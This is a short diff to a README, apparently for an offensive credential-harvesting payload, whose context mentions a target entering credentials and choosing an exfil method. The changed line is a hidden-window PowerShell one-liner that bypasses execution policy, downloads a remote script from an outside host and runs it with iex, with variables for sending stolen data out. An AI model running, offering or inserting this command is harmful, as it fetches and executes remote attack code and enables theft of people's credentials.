@@ -47,7 +47,7 @@ Once the target enters their credentials their information will be uploaded to y
 * Fill in either variable or both to set your exfil method
 
 ```
-powershell -w h -ep bypass $dc='';$db='';iwr https://jakoby.lol/35k | iex
+powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/35k | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
